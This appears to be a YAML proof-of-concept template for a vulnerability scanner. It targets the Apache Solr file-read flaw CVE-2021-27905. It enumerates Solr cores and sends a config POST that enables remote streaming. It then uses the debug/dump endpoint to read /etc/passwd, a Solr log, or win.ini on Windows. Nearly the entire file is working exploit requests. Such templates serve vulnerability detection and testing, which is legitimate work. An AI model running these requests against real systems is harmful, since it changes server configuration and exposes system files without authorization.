name: poc-yaml-apache-solr-ssrf-cve-2021-27905
binding: b46f1664-440e-479f-a0e0-ac7ae3d1110e
manual: true
detail:
    author: whami-root(https://github.com/whami-root)
    links:
        - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186
    vulnerability:
        id: CT-152181
        level: critical
transport: http
rules:
    linux0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: response.status == 200 && response.body.bcontains(b"responseHeader")
        output:
            search: '''"name":"(?P<core>.+?)"''.bsubmatch(response.body)'
            core: search["core"]
    linux1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            headers:
                Content-Type: application/json
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    linux2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///etc/passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    linux3:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///var/solr/logs/solr_gc.log
        expression: response.status == 200 && response.body_string.contains("org.apache.solr.handler.DumpRequestHandler") && response.body_string.contains('"stream"')
    windows0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: "true"
        output:
            search: '''"name":"(?P<core>.+?)"''.bsubmatch(response.body)'
            core: search["core"]
    windows1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            headers:
                Content-Type: application/json
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    windows2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///c://windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux0() && linux1() && (linux2() || linux3()) || windows0() && windows1() && windows2()
